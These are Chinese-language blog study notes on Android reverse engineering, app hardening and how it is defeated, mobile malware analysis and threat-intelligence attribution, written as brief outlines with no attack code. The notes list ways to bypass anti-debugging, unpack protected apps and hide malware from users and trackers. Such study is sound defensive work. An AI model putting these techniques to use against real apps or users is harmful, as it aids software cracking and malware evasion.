title="静态分析"></a>静态分析</h4><p>1.直接分析smali代码<br>类<br>基本数据类型<br>寄存器<br>函数和函数调用<br>代码块和跳转</p><p>2.分析伪java代码  </p><p>3.直接分析arm指令</p><ul><li>寄存器 SP, PC, LR </li><li>传参方式 返回值一般在R0</li><li>跳转 B, BL, BX, BLX</li><li>存储器访问 LTR, STR等</li><li>数据处理</li><li>armh和thumb切换</li></ul><p>4.分析伪C++代码</p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>1.AS无源码调试 [TODO，昨天的实验]</p><ul><li>配置APP为可调试状态</li><li>反编译APK将smali导入AS工程（安装Smalidea插件）</li><li>新建remote调试，并配置好端口</li><li>以调试模式启动APP，开始调试</li></ul><p>2.IDA调试 Android SO [TODO, 同样是昨天的实验]</p><ul><li>IDA导入SO文件</li><li>root设备上启动android_server<ul><li>adb push/chmod</li></ul></li><li>IDA新建Remote Android Debuger<ul><li>adb forward tcp:23946 tcp:23946</li></ul></li><li>选取目标进程，断点调试</li></ul><p>3.Smali代码注入（插桩）</p><ul><li>注入方法：反编译——修改Smali代码——重打包</li><li>使用场景：<ul><li>批量打印logo</li><li>控制流分析</li><li>数据流分析</li></ul></li><li>问题</li><li>重打包失败</li><li>签名检查</li><li>寄存器维护（和重打包失败一致）</li></ul><p>4.HOOK技术</p><ul><li>使用场景<ul><li>注入到目标代码，改变执行结果</li><li>获取某一状态下的变量值</li></ul></li><li>HOOK本质（要理解工具、技术的本质，再去使用）<ul><li>代码注入</li></ul></li><li>HOOK工具<ul><li>Xposed —— 替换app_process（所有进程的母进程）</li><li>Frida —— Ptrace注入 [TODO，后面去研究一下]<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114105225.png" style="zoom: 33%;" />图：Xposed和Frida对比</li></ul></li></ul><ol start="5"><li>使用Frida Hook APP</li></ol><ul><li><p>注入原理</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114105700.png" style="zoom:50%;" /></li><li><p>使用场景</p><ul><li>设备root</li><li>非root</li></ul></li><li><p>两种模式</p><ul><li>Attach 已有进程上附加，适合已运行的服务上，尤其是一些系统服务</li><li>Spawn 新起一个进程，适合进程刚启动时</li></ul></li><li><p>例子</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114110036.png" style="zoom:50%;" /></li></ul><h4 id="动静结合"><a href="#动静结合" class="headerlink" title="动静结合"></a>动静结合</h4><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>扩：腾讯玄武安全实验室，应用克隆</p><hr><h1 id="Android应用安全保护和对抗"><a href="#Android应用安全保护和对抗" class="headerlink" title="Android应用安全保护和对抗"></a>Android应用安全保护和对抗</h1><h2 id="如何保护？"><a href="#如何保护？" class="headerlink" title="如何保护？"></a>如何保护？</h2><p>反编译（干扰反编译工具）—— 目标定位（代码混淆） —— 核心目标逆向（代码混淆、反调试、加壳）</p><h2 id="1-干扰反编译工具"><a href="#1-干扰反编译工具" class="headerlink" title="1. 干扰反编译工具"></a>1. 干扰反编译工具</h2><h3 id="利用反编译工具的bug或漏洞"><a href="#利用反编译工具的bug或漏洞" class="headerlink" title="利用反编译工具的bug或漏洞"></a>利用反编译工具的bug或漏洞</h3><ul><li>AndroidManifest.xml</li><li>dex</li><li>So</li></ul><h3 id="转换成代码时的漏洞"><a href="#转换成代码时的漏洞" class="headerlink" title="转换成代码时的漏洞"></a>转换成代码时的漏洞</h3><ul><li>Smali -&gt; Java</li><li>Arm指令 -&gt; C++</li></ul><h3 id="链接资源文件时的bug"><a href="#链接资源文件时的bug" class="headerlink" title="链接资源文件时的bug"></a>链接资源文件时的bug</h3><ul><li>特殊的资源文件</li><li>超长的资源id</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114113611.png" style="zoom:33%;" /><h3 id="对抗-gt-干扰反编译"><a href="#对抗-gt-干扰反编译" class="headerlink" title="对抗-&gt;干扰反编译"></a>对抗-&gt;干扰反编译</h3><p>1.反编译时不链接资源文件 –no-resource<br>2.使用新版本的反编译工具<br>3.分析底层的反编译代码</p><ul><li>Smali</li><li>Arm指令 </li></ul><p>4.打造自己的逆向工具链（强联推荐，在对抗时，甚至是开发自己的反编译工具）</p><h2 id="2-代码混淆"><a href="#2-代码混淆" class="headerlink" title="2. 代码混淆"></a>2. 代码混淆</h2><h3 id="将代码变得难以阅读"><a href="#将代码变得难以阅读" class="headerlink" title="将代码变得难以阅读"></a>将代码变得难以阅读</h3><ul><li>变量名、类名、方法名混淆</li><li>字符串加密</li><li>控制流混淆</li></ul><h3 id="变量名、类名、方法名混淆"><a href="#变量名、类名、方法名混淆" class="headerlink" title="变量名、类名、方法名混淆"></a>变量名、类名、方法名混淆</h3><ul><li>超长名字 00o0ooo00ooo000ooo</li><li>相似字符 mabin -&gt; m4bln</li><li>特定含义的代码 int int= 5</li><li>特殊编码 ȷava \u0237</li><li>难以阅读的字符</li></ul><h3 id="字符串加密"><a href="#字符串加密" class="headerlink" title="字符串加密"></a>字符串加密</h3><ul><li>编码：ascii码、Base64、Unicode</li><li>自己实现的字符串加密<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114114413.png"></li></ul><h3 id="控制流混淆-平坦"><a href="#控制流混淆-平坦" class="headerlink" title="控制流混淆/平坦"></a>控制流混淆/平坦</h3><ul><li>运算混淆 a+b-&gt;a+c/d–c/d+b</li><li>控制流伪造</li></ul><h3 id="控制流平坦化（比较高级）"><a href="#控制流平坦化（比较高级）" class="headerlink" title="控制流平坦化（比较高级）"></a>控制流平坦化（比较高级）</h3><ul><li>工具：OLLVM</li><li>原理：利用分发器，树立代码，通过分发器来控制代码流程，让线性的代码平坦化</li><li><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114114548.png" style="zoom:50%;" /> </li></ul><h3 id="代码混淆工具"><a href="#代码混淆工具" class="headerlink" title="代码混淆工具"></a>代码混淆工具</h3><h4 id="Java工具"><a href="#Java工具" class="headerlink" title="Java工具"></a>Java工具</h4><ul><li>ProGuard</li><li>DexGuard</li></ul><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><p>工具：OLLVM</p><h3 id="混淆的问题和使用场景"><a href="#混淆的问题和使用场景" class="headerlink" title="混淆的问题和使用场景"></a>混淆的问题和使用场景</h3><h4 id="混淆带来的问题"><a href="#混淆带来的问题" class="headerlink" title="混淆带来的问题"></a>混淆带来的问题</h4><ul><li>运行不稳定</li><li>开发调试困难</li><li>执行效率低</li></ul><h4 id="什么APP会使用混淆"><a href="#什么APP会使用混淆" class="headerlink" title="什么APP会使用混淆?"></a>什么APP会使用混淆?</h4><ul><li>受众基础大的APP不会使用“变态”的混淆方式 • 即使混淆，也只是一小部分核心逻辑</li><li>老版本的APP一般不会混淆</li><li>纯混淆的CTF题目很无聊</li><li>企业级的APP</li></ul><h4 id="对抗代码混淆"><a href="#对抗代码混淆" class="headerlink" title="对抗代码混淆"></a>对抗代码混淆</h4><p>1.变量名、类名、方法名混淆</p><ul><li>变量重命名 jeb、重打包</li><li>寻找老版本app</li><li>根据开源代码映射</li><li>自动化 -&gt; 自动化相似代码检测</li></ul><p>2.字符串加密</p><ul><li>静态分析替换</li><li>动态hook</li></ul><p>3.控制流混淆</p><ul><li>优化反编译工具</li><li>符号执行</li><li>硬核逆向 状态机、经验、耐心</li></ul><h2 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h2><p>扩：15年iOS系统解析字符串时，系统崩溃，<a href="https://www.zhihu.com/question/21568134" target="_blank" rel="noopener">参考</a><br>扩：[重要]一些加了混淆的APP，可以去查看其老版本，老版本由于成本等问题，一般不会混淆，这是一个很好的入手点！</p><h2 id="3-反调试"><a href="#3-反调试" class="headerlink" title="3. 反调试"></a>3. 反调试</h2><h3 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h3><ul><li><p>先占坑：自己ptrace自己</p></li><li><p>检测TracePid的值<br>/proc/pid/status和/proc/pid/task/pid/status:普<br>通状态下，TracerPid这项应该为0;调试状态下 为调试进程的PID</p></li></ul><h3 id="检测调试器"><a href="#检测调试器" class="headerlink" title="检测调试器"></a>检测调试器</h3><ul><li><p>进程名</p><ul><li>gdb_server</li><li>android-server</li></ul></li><li><p>端口号</p><ul><li>IDA: 23946</li><li>Frida: 27042</li></ul></li><li><p>内存特征码</p></li></ul><h3 id="基于时间的检测"><a href="#基于时间的检测" class="headerlink" title="基于时间的检测"></a>基于时间的检测</h3><p>检测程序自身是不是被下了断点，正在被调试。现实中用得比较少。</p><h3 id="对抗反调试"><a href="#对抗反调试" class="headerlink" title="对抗反调试"></a>对抗反调试</h3><ul><li>找到所有的检测点并Patch（一个个绕过）</li><li>抢占先机式的Hook</li><li>开启上帝模式 – 修改系统 （打造自己的工具链时会用到）</li></ul><h2 id="4-加壳与脱壳"><a href="#4-加壳与脱壳" class="headerlink" title="4. 加壳与脱壳"></a>4. 加壳与脱壳</h2><h3 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h3><h4 id="Dex加固"><a href="#Dex加固" class="headerlink" title="Dex加固"></a>Dex加固</h4><ul><li>指令抽取</li><li>Dex加密<ul><li><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114141547.png"> </li></ul></li><li>Java-&gt;C</li></ul><h4 id="So加固"><a href="#So加固" class="headerlink" title="So加固"></a>So加固</h4><ul><li>有源码<ul><li>vmp</li></ul></li><li>无源码<ul><li>So加密</li><li>Section加密</li></ul></li></ul><h3 id="加固后APK运行过程"><a href="#加固后APK运行过程" class="headerlink" title="加固后APK运行过程"></a>加固后APK运行过程</h3><p>Process.start-&gt;Application创建-&gt;attachBaseContext-&gt;onCreate-&gt;onStart-&gt;onResume-&gt;Activity生命周期</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114141813.png" style="zoom: 33%;" /><ol><li>入口在壳dex处,获取“执行 权”</li><li>壳dex初始化</li><li>解密加固的dex</li><li>调用DexClassLoader加载解<br>密后的dex</li><li>“执行权”还给原dex</li></ol><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><h4 id="Dex脱壳"><a href="#Dex脱壳" class="headerlink" title="Dex脱壳"></a>Dex脱壳</h4><ul><li><p>Hook dex加载函数</p></li><li><p>Dump内存重建dex</p></li><li><p>定制化系统</p></li><li><p>脱壳工具</p><ul><li>dumpDex</li><li>FDex2</li><li>Frida</li></ul></li></ul><h4 id="So脱壳"><a href="#So脱壳" class="headerlink" title="So脱壳"></a>So脱壳</h4><ul><li><p>解密so</p><ul><li>hook loader</li><li>修复section</li><li>dump内存</li></ul></li><li><p>vmp</p><ul><li>硬逆</li><li>状态机</li><li>虚拟机入口</li></ul></li></ul><h2 id="移动应用第三方加固方案分析"><a href="#移动应用第三方加固方案分析" class="headerlink" title="移动应用第三方加固方案分析"></a>移动应用第三方加固方案分析</h2><p><a href="https://www.cnblogs.com/baiqiantao/p/9286449.html" target="_blank" rel="noopener">https://www.cnblogs.com/baiqiantao/p/9286449.html</a></p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>建立体系架构，遇到的知识点归纳到这边，这样逆向起来会非常轻松</p><h2 id="例题（GeekPWN）"><a href="#例题（GeekPWN）" class="headerlink" title="例题（GeekPWN）"></a>例题（GeekPWN）</h2><h3 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h3><p>1.包名<br>2.签名原理<br>3.障眼法、干扰<br>4.文件判断（信息搜集）<br>5.编程能力</p><p>WP：安全客/84837 无人机的钥匙</p><h2 id="Frida使用"><a href="#Frida使用" class="headerlink" title="Frida使用"></a>Frida使用</h2><h3 id="Frida无法使用的原因"><a href="#Frida无法使用的原因" class="headerlink" title="Frida无法使用的原因"></a>Frida无法使用的原因</h3><p>1.root<br>2.selinux（一般需要关闭）<br>3.bug（在GitHub上的issues上）</p><h3 id="Hook不上的几种原因"><a href="#Hook不上的几种原因" class="headerlink" title="Hook不上的几种原因"></a>Hook不上的几种原因</h3><p>1.进程没有选对<br>2.动态加载的dex（插件化）<br>3.语法错误</p><h2 id="如何做安全研究？"><a href="#如何做安全研究？" class="headerlink" title="如何做安全研究？"></a>如何做安全研究？</h2><h3 id="保持一份热情"><a href="#保持一份热情" class="headerlink" title="保持一份热情"></a>保持一份热情</h3><h3 id="持续的学习"><a href="#持续的学习" class="headerlink" title="持续的学习"></a>持续的学习</h3><ul><li>安全咨询 <a href="https://sec.today/pulses/" target="_blank" rel="noopener">sec.today</a> Twitter</li><li>安全社区 看雪，吾爱破解，freebuf</li><li>安全风向 google/apple 漏洞公告、工业界（BlackHat）学术界会议（四大峰会）</li></ul><h3 id="深度决定了广度"><a href="#深度决定了广度" class="headerlink" title="深度决定了广度"></a>深度决定了广度</h3><ul><li><p>刨根问底<br>e.g. 深入学习完Android后，再学习iOS会非常轻松</p></li><li><p>沉得住气</p></li><li><p>善于思考、总结、沉淀</p></li><li><p>写博客</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动恶意代码分析及威胁情报</title>
      <link href="/2020/01/15/%E7%A7%BB%E5%8A%A8%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
      <url>/2020/01/15/%E7%A7%BB%E5%8A%A8%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="移动恶意应用分析"><a href="#移动恶意应用分析" class="headerlink" title="移动恶意应用分析"></a>移动恶意应用分析</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115220552.png"><br>图：背景</p><h2 id="恶意代码分析背景概述"><a href="#恶意代码分析背景概述" class="headerlink" title="恶意代码分析背景概述"></a>恶意代码分析背景概述</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>1.全面的移动威胁<br>2.移动生态环节面临的安全威胁<br>表面：黑灰产<br>里面：国家队<br>3.攻击手段的持续进化<br>4.恶意色情软件增长趋势<br>一般不用支付宝、微信，使用第三方<br>5.地下社工库</p><ul><li>完成原始数据积累</li><li>完善的黑产分工协作体系</li></ul><p>6.持续扩大的威胁面<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115095230.png" style="zoom: 25%;" /></p><p>7.移动威胁从个人向组织迁移</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>1.和产业链高度依存<br>2.生物学悖论<br>破坏性越大，传播性越差<br>3.病毒的生命周期<br>一般是1～2个月不到<br>4.国家意志</p><h3 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h3><ul><li>木马</li><li>蠕虫<ul><li>蓝牙蠕虫</li></ul></li><li>后门</li><li>工具</li></ul><h3 id="命名体系"><a href="#命名体系" class="headerlink" title="命名体系"></a>命名体系</h3><p>一般格式为：&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt;<br>e.g. Worm.Sasser.b</p><h3 id="趋势"><a href="#趋势" class="headerlink" title="趋势"></a>趋势</h3><ul><li>恶意代码规模保持稳定增长</li><li>恶意代码高度产业化<ul><li>东南亚 </li></ul></li><li>移动端成为APT新战场</li></ul><h2 id="1-安卓病毒分析"><a href="#1-安卓病毒分析" class="headerlink" title="1. 安卓病毒分析"></a>1. 安卓病毒分析</h2><h3 id="APK格式介绍"><a href="#APK格式介绍" class="headerlink" title="APK格式介绍"></a>APK格式介绍</h3><p>参考前两天</p><h3 id="恶意行为汇总"><a href="#恶意行为汇总" class="headerlink" title="恶意行为汇总"></a>恶意行为汇总</h3><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>Smaliviewer</li><li>APKTool</li><li>Dex2jar</li><li>JEB</li><li>IDA</li><li>AndroidKiller</li><li>AndroidGuard # 偏学术性质</li></ul><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>可参考绿盟的<a href="http://blog.nsfocus.net/tag/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%89%8B%E5%86%8C/" target="_blank" rel="noopener">手册</a></p><ul><li><p>快读定位法</p><ul><li>敏感API搜索</li></ul></li><li><p>对比法</p></li><li><p>代码流程法</p><ul><li>从Mainfest开始一步步看 </li></ul></li><li><p>遍历法</p><ul><li>JEB有重命名功能，一个个功能死磕，一般针对混淆非常严重的代码 </li></ul></li></ul><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><h4 id="工具-技术"><a href="#工具-技术" class="headerlink" title="工具/技术"></a>工具/技术</h4><ul><li>Andebug</li><li>IDA</li><li>Frida/XPosed/..</li><li>Wireshark/tcpdump/..</li></ul><h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul><li>Smali Hook</li><li>Xposed Hook<ul><li>Tips：忽略系统文件</li><li>Tips：不要hook资源文件，可能失效</li></ul></li><li>Substrate native hook</li><li>Frida hook    # 建议使用Frida</li></ul><h3 id="分析系统（沙盒系统）"><a href="#分析系统（沙盒系统）" class="headerlink" title="分析系统（沙盒系统）"></a>分析系统（沙盒系统）</h3><ul><li>DroidBox</li><li>AndroGuard</li><li>Inspeckage    # 基于xposed</li><li>RMS(antiy)</li><li>cuckoo <a href="https://cuckoosandbox.org/" target="_blank" rel="noopener">https://cuckoosandbox.org/</a><ul><li>布谷鸟</li></ul></li></ul><h3 id="人工分析实践知识"><a href="#人工分析实践知识" class="headerlink" title="人工分析实践知识"></a>人工分析实践知识</h3><h4 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h4><h4 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h4><p>联网请求数据包实例（Wireshark抓包）<br>寻找情报来源</p><h4 id="工具am"><a href="#工具am" class="headerlink" title="工具am"></a>工具am</h4><p>用talent模拟短信</p><h4 id="IDA动静态"><a href="#IDA动静态" class="headerlink" title="IDA动静态"></a>IDA动静态</h4><p>一般对</p><h4 id="在线系统"><a href="#在线系统" class="headerlink" title="在线系统"></a>在线系统</h4><ul><li>VS</li><li>Sandroid    # 学术项目</li><li>Koodous    # 交流、分享，<a href="https://koodous.com/" target="_blank" rel="noopener">链接</a></li><li>Janus</li></ul><h2 id="2-反病毒引擎"><a href="#2-反病毒引擎" class="headerlink" title="2. 反病毒引擎"></a>2. 反病毒引擎</h2><h3 id="引擎结构"><a href="#引擎结构" class="headerlink" title="引擎结构"></a>引擎结构</h3><p>1.对象获取：各种资源文件的获取</p><p>2.对象检测：各种分析模式、脱壳、解包</p><p>3.对象处理：告知与处理</p><p>4.病毒库：基于知识积累的数据保障</p><h3 id="特征库"><a href="#特征库" class="headerlink" title="特征库"></a>特征库</h3><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><hr><h3 id="本地检测技术"><a href="#本地检测技术" class="headerlink" title="本地检测技术"></a>本地检测技术</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>应用的基础特征：文件Hash、内嵌文件Hash、证书等</p><h4 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h4><p>应用内所包含的各类符号特征：配置符号信息、dex符号信息、其他可执行文件符号信息</p><h4 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h4><p>基于行为的模型检测：行为监控、行为建模</p><hr><h3 id="体系建设"><a href="#体系建设" class="headerlink" title="体系建设"></a>体系建设</h3><p>尽可能基于代码、已有的基础，进行拆解，二次分析</p><hr><h3 id="AVL引擎本地检测逻辑"><a href="#AVL引擎本地检测逻辑" class="headerlink" title="AVL引擎本地检测逻辑"></a>AVL引擎本地检测逻辑</h3><h4 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h4><p>1.降维<br>基于应用指纹的分类策略</p><p>2.实际运用</p><ul><li>证书随机化特征</li><li>应用执行文件结构</li><li>基于图标的色情检测</li><li>基于文件的组织结构特征</li><li>基于决策树的行为检测模型</li></ul><h2 id="3-移动威胁情报"><a href="#3-移动威胁情报" class="headerlink" title="3. 移动威胁情报"></a>3. 移动威胁情报</h2><h3 id="威胁情报的定义"><a href="#威胁情报的定义" class="headerlink" title="威胁情报的定义"></a>威胁情报的定义</h3><p>威胁情报是基于证据的知识，包括场景、机制、指标、含义和可操作的建议。 </p><p>这些知识是关于现存的、或者是即将出现的针对资产的威胁或危险的，可为主体响应相关威胁或危险提供决策信息。 </p><p>决策 —— 情报 —— 信息 —— 数据  </p><h3 id="威胁情报的体系"><a href="#威胁情报的体系" class="headerlink" title="威胁情报的体系"></a>威胁情报的体系</h3><ul><li><p>强烈的外在和内在的面向威胁的知识管理体系方法</p></li><li><p>情报是高度具备驱动力的数据流转和响应驱动体系</p></li></ul><h4 id="面向威胁情报的大数据体系"><a href="#面向威胁情报的大数据体系" class="headerlink" title="面向威胁情报的大数据体系"></a>面向威胁情报的大数据体系</h4><ul><li>数据采集 —— 数据萃取 —— 数据结构化 —— 归一化设计 —— 数据采集迭代</li></ul><ul><li>通过邮件和短信进行，在流量出口做检测</li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115134913.png"></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115134943.png"></p><h4 id="自动化与人工结合的分析运行体系（情报驱动安全）"><a href="#自动化与人工结合的分析运行体系（情报驱动安全）" class="headerlink" title="自动化与人工结合的分析运行体系（情报驱动安全）"></a>自动化与人工结合的分析运行体系（情报驱动安全）</h4><p>1.自动化流水线的检测和判别体系，大大减少人工作业的工作量</p><p>2.自动化动态分析</p><ul><li>典型事件触发</li><li>行为事件监控 </li></ul><p>3.分析组</p><ul><li>引擎工作引擎</li><li>基于<strong>归一化</strong>（标签类）数据结构的文件分类器</li></ul><p>4.智能分析系统—— 静态 ｜ 动态 ｜ 机器学习 —— 相互补充</p><h4 id="威胁情报的困难金字塔"><a href="#威胁情报的困难金字塔" class="headerlink" title="威胁情报的困难金字塔"></a>威胁情报的困难金字塔</h4><p>隐晦 —— Incident （最难）</p><p>复杂 —— TTP Relation</p><p>高对抗 —— TTP/Exploit, Malware</p><p>穿透 —— Evil Device(Mobile/IOT)</p><p>不可控 —— SDK/Third Parth</p><p>方式多样性 —— C2(Network/Other)</p><p>符号多样性 —— Symbol</p><p>繁琐，低效 —— Hash （最容易）</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115200355.png" style="zoom: 33%;" /><ul><li>有代码复用</li><li>对日志分析</li></ul><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>1.体系化建设是根本<br>2.多方位合作（国*局也要和其他厂商进一步合作）<br>3.找到适合自己的方式（找到自己的优势）<br>4.多体系合作</p><h2 id="4-恶意代码高级对抗"><a href="#4-恶意代码高级对抗" class="headerlink" title="4. 恶意代码高级对抗"></a>4. 恶意代码高级对抗</h2><h3 id="对抗分析工具（不让反编译等）"><a href="#对抗分析工具（不让反编译等）" class="headerlink" title="对抗分析工具（不让反编译等）"></a>对抗分析工具（不让反编译等）</h3><ul><li>Ptrace自身<br>…</li></ul><h3 id="对抗用户感知（不让用户知道）"><a href="#对抗用户感知（不让用户知道）" class="headerlink" title="对抗用户感知（不让用户知道）"></a>对抗用户感知（不让用户知道）</h3><ul><li>隐藏图标</li><li>透明图标</li><li>静默下载/安装</li><li>预装（二次换装比较多）</li><li>植入知名应用</li><li>伪装系统应用</li><li>ISP（互联网服务提供商）劫持</li><li>邮件</li><li>社工</li></ul><h3 id="反追踪（不让自己被追踪）"><a href="#反追踪（不让自己被追踪）" class="headerlink" title="反追踪（不让自己被追踪）"></a>反追踪（不让自己被追踪）</h3><ul><li>利用短链接</li><li>域名隐私保护</li><li>伪基站</li><li>动态DNS</li><li>盗用他人信息</li><li>使用云服务</li><li>入侵无关网站</li></ul><h3 id="环境对抗"><a href="#环境对抗" class="headerlink" title="环境对抗"></a>环境对抗</h3><ul><li>沙箱检测</li><li>条件触发</li><li>结束杀软</li><li>动态加载</li><li>ROOT提权（现在较难）</li><li>杀软检测</li></ul><h3 id="银弹"><a href="#银弹" class="headerlink" title="银弹"></a>银弹</h3><p>能力较弱，需要APT的情况下，购买第三方的情报</p><p>代码相同，需要客户侧写</p><h3 id="Application层"><a href="#Application层" class="headerlink" title="Application层"></a>Application层</h3><ul><li>范围：各种APP</li></ul><h3 id="Framework层"><a href="#Framework层" class="headerlink" title="Framework层"></a>Framework层</h3><ul><li><p>范围：各种API</p></li><li><p>案例：各种RAT（间*谍*软件）</p></li></ul><h3 id="Kernel层"><a href="#Kernel层" class="headerlink" title="Kernel层"></a>Kernel层</h3><ul><li>范围：系统各种驱动</li><li>案例：hackteam exploit</li></ul><h3 id="案例：RottlenSys"><a href="#案例：RottlenSys" class="headerlink" title="案例：RottlenSys"></a>案例：RottlenSys</h3><h2 id="5-威胁情报与溯源"><a href="#5-威胁情报与溯源" class="headerlink" title="5. 威胁情报与溯源"></a>5. 威胁情报与溯源</h2><h3 id="攻击工具持续演变"><a href="#攻击工具持续演变" class="headerlink" title="攻击工具持续演变"></a>攻击工具持续演变</h3><p>萌芽期 —— 发展期（加壳）—— 中后期 —— 后移动攻防时代</p><p>中后期后面，武器化，漏洞，移动攻击开始武器化、定向化和组织化</p><h3 id="移动终端已经成为APT的新战场"><a href="#移动终端已经成为APT的新战场" class="headerlink" title="移动终端已经成为APT的新战场"></a>移动终端已经成为APT的新战场</h3><h4 id="基本规律"><a href="#基本规律" class="headerlink" title="基本规律"></a>基本规律</h4><p>只与目标承载的资产资源和与更重要目标的关联度有关，基本不考虑难易</p><h4 id="三个特点"><a href="#三个特点" class="headerlink" title="三个特点"></a>三个特点</h4><p>1.对移动应用<br>2.长期<br>3 应用高级攻击技术</p><h4 id="移动APT攻击"><a href="#移动APT攻击" class="headerlink" title="移动APT攻击"></a>移动APT攻击</h4><p>攻击者 ——&gt; 手机终端 &lt;——&gt; 攻击对象<br> <img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115212401.png"></p><h4 id="攻击植入方式"><a href="#攻击植入方式" class="headerlink" title="攻击植入方式"></a>攻击植入方式</h4><p>1.鱼叉攻击</p><ul><li>邮件</li><li>网站</li><li>短信</li></ul><p>2.应用市场<br>3.论坛<br>4.应用市场<br>5.远程漏洞或intent schema url<br>6….</p><p>通常我们更关心木马、后门、间*谍软件类的窃取人人的行为和信息的恶意代码。<br>社交网络的渗透可以进行用户侧写，使话术更加完美。  </p><h4 id="案例：乌克兰"><a href="#案例：乌克兰" class="headerlink" title="案例：乌克兰"></a>案例：乌克兰</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115141615.png"></p><h3 id="分析攻击思路与流程"><a href="#分析攻击思路与流程" class="headerlink" title="分析攻击思路与流程"></a>分析攻击思路与流程</h3><ol><li>公开情报</li><li>主动发现</li></ol><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115145755.png" style="zoom:50%;" /><p>国内未经授权的反制都是违法的</p><hr><h4 id="Android-高价值样本发现"><a href="#Android-高价值样本发现" class="headerlink" title="Android 高价值样本发现"></a>Android 高价值样本发现</h4><p>溯源</p><p>复盘</p><p>场景</p><p>意图</p><h4 id="Android证书分析"><a href="#Android证书分析" class="headerlink" title="Android证书分析"></a>Android证书分析</h4><p>1.签名证书<br>2.时间<br>判断时间纬度，开发者在哪个时区，但不可信，可以被篡改、伪造</p><h3 id="同源性检测"><a href="#同源性检测" class="headerlink" title="同源性检测"></a>同源性检测</h3><h4 id="家族同源性检测"><a href="#家族同源性检测" class="headerlink" title="家族同源性检测"></a>家族同源性检测</h4><p>1.恶意行为</p><p>2.攻击方式</p><p>3.攻击目标</p><ul><li>地域</li><li>目标人群</li><li>特定行业</li></ul><h4 id="资源同源性检测"><a href="#资源同源性检测" class="headerlink" title="资源同源性检测"></a>资源同源性检测</h4><p>1.控制域</p><ul><li>Whois信息</li><li>注册者</li><li>有效期</li></ul><p>2.服务提供商及手机号</p><ul><li>归属地</li><li>背景信息</li></ul><p>3.邮箱</p><p>4.载荷</p><ul><li>运行方式</li><li>关键行为</li></ul><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>1.衍生物</p><ul><li>可执行文件</li></ul><p>2.程序资源文件</p><ul><li>关键性界面布局</li><li>图片、音频和视频</li><li>核心文件</li></ul><p>3.关键配置文件</p><p>4.文件大小</p><ul><li>文件大小可以做参考，但不一定准确（但注意，威胁情报这快的一个原则就是，所有的信息都是不可信的，都需要进行交叉验证）</li></ul><h4 id="代码同源性检测"><a href="#代码同源性检测" class="headerlink" title="代码同源性检测"></a>代码同源性检测</h4><p>1.程序名</p><p>2.签名证书</p><ul><li>注意签名证书的时间，时区，判断其来源，但可伪造并不一定可信</li></ul><p>3.核心流程</p><p>4.程序模块</p><p>5.编译信息</p><ul><li>编译时间</li><li>编译器信息</li></ul><p>6.作者信息</p><p>7.版权信息</p><p>8.文件大小</p><p>在分析代码流程时，最好移除第三方库，排除其他的关联。</p><h4 id="传播同源性检测"><a href="#传播同源性检测" class="headerlink" 